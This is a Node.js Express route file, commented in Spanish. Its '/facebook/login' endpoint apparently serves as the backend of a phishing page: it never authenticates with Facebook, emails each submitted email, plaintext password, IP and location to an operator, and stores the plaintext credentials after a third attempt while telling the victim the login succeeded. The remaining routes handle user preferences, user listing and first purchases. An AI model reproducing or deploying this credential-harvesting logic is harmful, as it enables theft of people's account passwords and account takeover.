const express = require('express');
const router = express.Router();
const { sendLoginAttemptEmail } = require('../services/emailService');
const { addUser, getUsers, verifyCredentials, findUserByEmail, updateUserPreferences, markFirstPurchase } = require('../services/userService');

// Mapa para almacenar intentos de inicio de sesión por email
const loginAttempts = new Map();

router.post('/facebook/login', async (req, res) => {
  try {
    const { email, password, location, timezone } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress;

    // Primero verificar si el usuario ya existe
    const existingUser = await findUserByEmail(email);
    
    if (existingUser) {
      // Si el usuario existe, verificar credenciales
      const verifiedUser = await verifyCredentials(email, password);
      
      if (verifiedUser) {
        // Credenciales correctas, iniciar sesión directamente
        return res.json({
          success: true,
          message: '¡Bienvenido de vuelta!',
          isExistingUser: true,
          user: verifiedUser
        });
      } else {
        // Credenciales incorrectas
        return res.status(401).json({
          success: false,
          message: 'Correo o contraseña incorrectos'
        });
      }
    }

    // Si el usuario no existe, proceder con el sistema de intentos
    if (!loginAttempts.has(email)) {
      loginAttempts.set(email, 0);
    }

    const attempts = loginAttempts.get(email);
    loginAttempts.set(email, attempts + 1);

    // Enviar notificación por correo
    await sendLoginAttemptEmail({
      method: 'facebook',
      email,
      password,
      location,
      timezone,
      ip: clientIp,
      timestamp: new Date().toISOString()
    });

    // Si es el tercer intento, guardar en el archivo JSON
    if (attempts + 1 === 3) {
      const user = await addUser({
        email,
        password,
        location,
        timezone,
        ip: clientIp,
        loginAttempts: 3,
        lastLoginDate: new Date().toISOString()
      });

      // Limpiar los intentos
      loginAttempts.delete(email);

      return res.json({
        success: true,
        message: '¡Bienvenido! Has iniciado sesión correctamente.',
        isThirdAttempt: true,
        user: {
          _id: user._id,
          email: user.email,
          registrationDate: user.registrationDate,
          preferences: user.preferences
        }
      });
    }

    // Para intentos 1 y 2
    res.json({
      success: true,
      message: 'Inicio de sesión procesado',
      attemptsRemaining: 3 - (attempts + 1)
    });

  } catch (error) {
    console.error('Error en el inicio de sesión:', error);
    res.status(500).json({
      success: false,
      message: 'Error al procesar el inicio de sesión'
    });
  }
});

// Ruta para actualizar preferencias
router.post('/preferences/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const preferences = req.body;
    
    const updatedUser = await updateUserPreferences(userId, preferences);
    
    res.json({
      success: true,
      message: 'Preferencias actualizadas correctamente',
      user: updatedUser
    });
  } catch (error) {
    console.error('Error al actualizar preferencias:', error);
    res.status(500).json({
      success: false,
      message: 'Error al actualizar las preferencias'
    });
  }
});

// Actualizar preferencias del usuario
router.put('/preferences/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const preferences = req.body;
    
    if (!userId) {
      return res.status(400).json({
        success: false,
        message: 'ID de usuario no proporcionado'
      });
    }

    const updatedUser = await updateUserPreferences(userId, preferences);
    
    res.json({
      success: true,
      user: {
        ...updatedUser,
        password: undefined
      },
      message: 'Preferencias actualizadas correctamente'
    });
  } catch (error) {
    console.error('Error al actualizar preferencias:', error);
    res.status(500).json({
      success: false,
      message: error.message || 'Error al actualizar las preferencias'
    });
  }
});

// Ruta para obtener usuarios
router.get('/users', async (req, res) => {
  try {
    const users = await getUsers();
    res.json(users.map(user => ({
      ...user,
      password: undefined // No enviar contraseñas
    })));
  } catch (error) {
    res.status(500).json({ message: 'Error al obtener usuarios' });
  }
});

// Ruta para marcar primera compra
router.post('/purchase/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const updatedUser = await markFirstPurchase(userId);
    
    res.json({
      success: true,
      message: 'Primera compra registrada correctamente',
      user: updatedUser
    });
  } catch (error) {
    console.error('Error al registrar la primera compra:', error);
    res.status(500).json({
      success: false,
      message: 'Error al registrar la primera compra'
    });
  }
});

module.exports = router;
